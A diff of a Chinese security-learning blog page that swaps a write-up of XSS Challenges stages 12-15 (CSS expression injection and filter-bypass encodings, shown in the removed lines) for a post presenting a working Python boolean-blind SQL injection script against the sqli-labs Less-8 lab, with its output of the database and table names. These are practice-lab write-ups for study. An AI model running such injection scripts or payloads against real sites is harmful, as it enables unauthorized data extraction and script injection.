@@ -6,20 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>XSS challengs 12-15 通关记录 | Joner的博客</title>
+  <title>sqli-labs8 编写脚本进行注入 | Joner的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="下面记录的是 XSS challenges stage 12-15关的通关过程，主要涉及IE8 的一些内容和行内样式注入，其中有一些查了网上的资料才做出来，还有两个实际是没有做出来的，这里先记录下来，等有时间再继续研究。">
-<meta name="keywords" content="XSS,XSS challenges">
+  <meta name="description" content="本篇主要记录的是sqli-labs 8 写的注入脚本，使用Python3编写，参考了网上一些脚本的写法，还通过这个脚本，学习了一些Python的函数和库。">
+<meta name="keywords" content="sqli-labs,sql注入,盲注">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS challengs 12-15 通关记录">
-<meta property="og:url" content="http://yoursite.com/2019/04/02/XSS-challengs-12-15-通关记录/index.html">
+<meta property="og:title" content="sqli-labs8 编写脚本进行注入">
+<meta property="og:url" content="http://yoursite.com/2019/04/04/sqli-labs8-编写脚本进行注入/index.html">
 <meta property="og:site_name" content="Joner的博客">
-<meta property="og:description" content="下面记录的是 XSS challenges stage 12-15关的通关过程，主要涉及IE8 的一些内容和行内样式注入，其中有一些查了网上的资料才做出来，还有两个实际是没有做出来的，这里先记录下来，等有时间再继续研究。">
+<meta property="og:description" content="本篇主要记录的是sqli-labs 8 写的注入脚本，使用Python3编写，参考了网上一些脚本的写法，还通过这个脚本，学习了一些Python的函数和库。">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-02T15:50:36.274Z">
+<meta property="og:updated_time" content="2019-04-04T11:30:07.757Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS challengs 12-15 通关记录">
-<meta name="twitter:description" content="下面记录的是 XSS challenges stage 12-15关的通关过程，主要涉及IE8 的一些内容和行内样式注入，其中有一些查了网上的资料才做出来，还有两个实际是没有做出来的，这里先记录下来，等有时间再继续研究。">
+<meta name="twitter:title" content="sqli-labs8 编写脚本进行注入">
+<meta name="twitter:description" content="本篇主要记录的是sqli-labs 8 写的注入脚本，使用Python3编写，参考了网上一些脚本的写法，还通过这个脚本，学习了一些Python的函数和库。">
   
     <link rel="alternative" href="/atom.xml" title="Joner的博客" type="application/atom+xml">
   
@@ -149,73 +149,38 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-XSS-challengs-12-15-通关记录" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sqli-labs8-编写脚本进行注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      XSS challengs 12-15 通关记录
+      sqli-labs8 编写脚本进行注入
     </h1>
   
 
         
-        <a href="/2019/04/02/XSS-challengs-12-15-通关记录/" class="archive-article-date">
-  	<time datetime="2019-04-02T15:49:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-02</time>
+        <a href="/2019/04/04/sqli-labs8-编写脚本进行注入/" class="archive-article-date">
+  	<time datetime="2019-04-04T11:29:15.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-04</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>下面记录的是 XSS challenges stage 12-15关的通关过程，主要涉及IE8 的一些内容和行内样式注入，其中有一些查了网上的资料才做出来，还有两个实际是没有做出来的，这里先记录下来，等有时间再继续研究。</p>
+        <p>本篇主要记录的是sqli-labs 8 写的注入脚本，使用Python3编写，参考了网上一些脚本的写法，还通过这个脚本，学习了一些Python的函数和库。</p>
 <a id="more"></a>
-<h2 id="stage-12"><a href="#stage-12" class="headerlink" title="stage #12"></a><a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=b23f6debebc8e29a75745eac6158b4340276a7d9" target="_blank" rel="noopener">stage #12</a></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>输入<code>&quot;&lt;script&gt;alert(&quot;ss&quot;)&lt;/script&gt;</code>之后发现回显的结果中双引号和<code>&lt;&gt;</code>没有了，所以推测过滤了这两个符号，这里用到的知识是</p>
-<blockquote>
-<p>在IE8中会把<code></code>识别为双引号</p>
+<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less -8"></a>Less -8</h3><blockquote>
+<p><a href="http://43.247.91.228:84/Less-8/" target="_blank" rel="noopener">地址</a></p>
 </blockquote>
-<p>所以设置windows自带浏览器兼容性设置，使用IE8打开这一关的网页，然后在搜索框中输入</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">``</span> onmousemove=alert(<span class="built_in">document</span>.domain);</span><br></pre></td></tr></table></figure>
-<p>移动鼠标后出现弹窗，获得下一关的地址。</p>
-<h2 id="stage-13"><a href="#stage-13" class="headerlink" title="stage  #13"></a><a href="http://xss-quiz.int21h.jp/stage13_0.php?sid=a3fab86d8417196bc1c9214ab00422c9892c2698" target="_blank" rel="noopener">stage  #13</a></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"p1"</span> <span class="attr">size</span>=<span class="string">"60"</span> <span class="attr">style</span>=<span class="string">"background-color:salmon"</span> <span class="attr">value</span>=<span class="string">"background-color:salmon"</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现里里面有个<code>style</code>样式，利用行内样式的动态属性进行xss</p>
+<p>本题的题目是Blind-Boolian Based-Single Quotes<br>地址后添加?id=1，回显<code>Welcome    Dhakkan You are in...........</code><br>再加上单引号后只有 <code>Welcome    Dhakkan</code>推测是使用了单引号<br>使用<code>0&#39; or 1=1 --+</code>返回正常，所以推测是使用单引号进行闭合，所以这里的注入过程应该和Less-5 一样，这一关是根据是否出现<code>You are in...........</code>来判断是否正确。</p>
+<p>这次尝试写个脚本注入，目前写到了查询出所有表名这一步，参考了网上一些这一关脚本的写法，主要是猜解字段长度和字段名，原理就是重复提交修改后的url，判断网页返回内容中是否有<code>You are in .........</code>，其中为了查看注入的过程，每个测试的URL都进行输出，可以注释掉。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://43.247.91.228:84/Less-8/?id="</span></span><br><span class="line">right_text=<span class="string">"You are in..........."</span></span><br><span class="line">table_names=[]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span><span class="params">(check_name,limit=<span class="string">""</span>)</span>:</span></span><br><span class="line">	length=<span class="number">0</span>;	</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		newurl=<span class="string">"1' and length("</span>+check_name+limit+<span class="string">")="</span>+str(length)+<span class="string">"#"</span></span><br><span class="line">		response = request.urlopen(url + parse.quote(newurl)).read().decode()</span><br><span class="line">		print(url+newurl)</span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			<span class="keyword">return</span> length</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			length+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取字段名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Guess_name</span><span class="params">(namelength,check_name,limit=<span class="string">""</span>)</span>:</span></span><br><span class="line">	name=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(namelength):</span><br><span class="line">		a,b=<span class="number">64</span>,<span class="number">64</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			b=int(b/<span class="number">2</span>)</span><br><span class="line">			newurl=<span class="string">"1' and ascii(substr("</span>+check_name+limit+<span class="string">","</span>+str(i+<span class="number">1</span>)+<span class="string">")"</span>+<span class="string">")&lt;"</span>+str(a)+<span class="string">"#"</span></span><br><span class="line">			print(url+newurl)</span><br><span class="line">			<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">				a-=b</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				newurl=<span class="string">"1' and ascii(substr("</span>+check_name+limit+<span class="string">","</span>+str(i+<span class="number">1</span>)+<span class="string">")"</span>+<span class="string">")="</span>+str(a)+<span class="string">"#"</span></span><br><span class="line">				<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">					name+=chr(a)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					a+=b</span><br><span class="line">	<span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取表的数量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTableNums</span><span class="params">(check_name)</span>:</span></span><br><span class="line">	table_nums=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		limit=<span class="string">" limit "</span>+str(table_nums)+<span class="string">",1"</span></span><br><span class="line">		newurl=<span class="string">"1' and ascii(substr("</span>+check_name+limit+<span class="string">"),1))&gt;0"</span>+<span class="string">"#"</span></span><br><span class="line">		<span class="keyword">if</span> check(newurl)==<span class="literal">True</span>:</span><br><span class="line">			table_nums+=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> table_nums</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取表的名字</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Guess_table_name</span><span class="params">(check_name,table_nums)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> n  <span class="keyword">in</span> range(table_nums):</span><br><span class="line">		<span class="comment">#获取表的长度</span></span><br><span class="line">		limit=<span class="string">" limit "</span>+str(n)+<span class="string">",1)"</span></span><br><span class="line">		length=getLength(check_name,limit)</span><br><span class="line">		print(<span class="string">"[+]长度为:"</span>+str(length))</span><br><span class="line">		<span class="comment">#获取表的名字</span></span><br><span class="line">		table_name=Guess_name(length,check_name,limit)</span><br><span class="line">		print(<span class="string">"[+]表名字为:"</span>+table_name)</span><br><span class="line">		table_names.append(table_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(newurl)</span>:</span></span><br><span class="line">	response = request.urlopen(url + parse.quote(newurl)).read().decode()</span><br><span class="line">	<span class="keyword">if</span> (re.search(<span class="string">"You are in..........."</span>,response)):</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DBnamelength=getLength(<span class="string">"database()"</span>)</span><br><span class="line">print(<span class="string">"[*] 数据库长度为:"</span> + str(DBnamelength))</span><br><span class="line">print(<span class="string">"[+] 开始获取数据库名字"</span>)</span><br><span class="line">DBname=Guess_name(DBnamelength,<span class="string">"database()"</span>)</span><br><span class="line">print(<span class="string">"[*] 数据库名字为:"</span>+ DBname)</span><br><span class="line">table_nums=getTableNums(<span class="string">"(select table_name from information_schema.tables where table_schema=database()"</span>)</span><br><span class="line">print(<span class="string">"[*]表的数量为:"</span>+str(table_nums))</span><br><span class="line">print(<span class="string">"[+]开始获取表名"</span>)</span><br><span class="line">Guess_table_name(<span class="string">"(select table_name from information_schema.tables where table_schema=database()"</span>,table_nums)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] 当前数据库名字为:"</span>+ DBname)</span><br><span class="line">print(<span class="string">"[*]表的数量为:"</span>+str(table_nums))</span><br><span class="line">print(<span class="string">"[*]所有表的名字为:"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(table_nums):</span><br><span class="line">	print(<span class="string">"		"</span>+table_names[i])</span><br></pre></td></tr></table></figure>
+<p>运行后的结果为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] 当前数据库名字为:security</span><br><span class="line">[*]表的数量为:4</span><br><span class="line">[*]所有表的名字为:</span><br><span class="line">		emails</span><br><span class="line">		referers</span><br><span class="line">		uagents</span><br><span class="line">		users</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p><em>行内样式</em></p>
-<p>我们同样可以在行内样式里利用IE浏览器支持的动态特性:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:expression(alert("</span><span class="attr">sss</span>"))"&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-<p>过滤器会检查关键字<code>style</code>，随后跟随的不能是&lt;，在随后是<code>expression/style=[^&lt;]*((ecpression\s*?[&gt;]*?)|(behavior\s*:))[^&lt;]*(?=\&gt;)/Uis</code>所以需要把&lt;放到其他地方：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color:'&lt;';color:expression(alert("</span><span class="attr">sss</span>"))"&gt;</span> </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-</blockquote>
-<blockquote>
-</blockquote>
-<p>插入代码</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss:expression(onmousemove=function()&#123;alert(document.domain)&#125;)</span><br></pre></td></tr></table></figure>
-<p>这个没搞出来</p>
-<h2 id="stage-14"><a href="#stage-14" class="headerlink" title="stage #14"></a><a href="http://xss-quiz.int21h.jp/stage-_-14.php?sid=0ccb3bac891178e3bd1966b5624529302f5efcf0" target="_blank" rel="noopener">stage #14</a></h2><p>安装上面一关的方法，在文本框中输入以下语句</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa:expression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br></pre></td></tr></table></figure>
-<p>提交后</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa:xxx(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br></pre></td></tr></table></figure>
-<p>expression被处理成了xxx，推测有正则过滤</p>
-<p>有四种方法来绕过过滤</p>
-<ul>
-<li>e -&gt; \0065 </li>
-<li>加入\隔断</li>
-<li>加入\0隔断</li>
-<li>加入/**/隔断</li>
-</ul>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aa:\0065 xpression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br><span class="line">aa:e\xpression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br><span class="line">aa:e\0xpression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br><span class="line">aa:e/**/xpression(onmouseover=function()&#123;alert(document.domain)&#125;)</span><br></pre></td></tr></table></figure>
-<h2 id="stage-15"><a href="#stage-15" class="headerlink" title="stage #15"></a><a href="http://xss-quiz.int21h.jp/stage__15.php?sid=5fb4fd17e95ff1b2104b179a9a49d173d8597681" target="_blank" rel="noopener">stage #15</a></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"123"</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>构造</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11";<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">"sss"</span>)</span></span><br></pre></td></tr></table></figure>
-<p>提交后查看结果发现一些字符被转换了</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">"11&amp;quot;;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;sss&amp;quot;)"</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">变成了&amp;lt;</span></span></span><br><span class="line"><span class="tag">&gt;</span>变成了&amp;gt;</span><br><span class="line">怎么绕过<span class="tag">&lt;<span class="name">和</span>&gt;</span>呢？</span><br><span class="line">16进制编码：</span><br><span class="line"><span class="tag">&lt; 变成了 \<span class="attr">x3c</span> </span></span><br><span class="line"><span class="tag">&gt;</span> 变成了 \x3e</span><br></pre></td></tr></table></figure>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\x3cscript\x3ealert(document.domain);\x3c/script\x3e #这个不行，应该是过滤了单个 \</span><br><span class="line">\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e #获得下一关地址</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><a href="https://blog.csdn.net/emaste_r/article/details/16988167" target="_blank" rel="noopener">2013 XSS Challenges Stage 解题报告</a></p>
+<p><a href="https://blog.csdn.net/sopora/article/details/82981606" target="_blank" rel="noopener">sqli-labs less8-10</a></p>
 </blockquote>
 
       
@@ -256,11 +221,15 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">XSS</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">sqli-labs</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">XSS challenges</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">sql注入</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">盲注</a>
         		</li>
       		
 		</ul>
@@ -316,7 +285,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/04/02/XSS-challengs-12-15-通关记录/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/04/04/sqli-labs8-编写脚本进行注入/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -330,18 +299,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/04/04/sqli-labs8-编写脚本进行注入/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          sqli-labs8 编写脚本进行注入
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/03/31/XSS-challengs5-11通过过程/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">XSS challengs5-11通过过程</div>
+    <a href="/2019/04/02/XSS-challengs-12-15-通关记录/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">XSS challengs 12-15 通关记录</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -368,7 +328,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#stage-12"><span class="toc-number">1.</span> <span class="toc-text">stage #12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stage-13"><span class="toc-number">2.</span> <span class="toc-text">stage  #13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stage-14"><span class="toc-number">3.</span> <span class="toc-text">stage #14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stage-15"><span class="toc-number">4.</span> <span class="toc-text">stage #15</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">1.</span> <span class="toc-text">Less -8</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -414,8 +374,8 @@
      
       <script type="text/javascript">
         var gitment = new Gitment({
-			  id: 'XSS challengs 12-15 通关记录',
-			  title: 'XSS challengs 12-15 通关记录',
+			  id: 'sqli-labs8 编写脚本进行注入',
+			  title: 'sqli-labs8 编写脚本进行注入',
 			  owner: 'joner11234',
 			  repo: 'joner11234.github.io',
 			  oauth: {
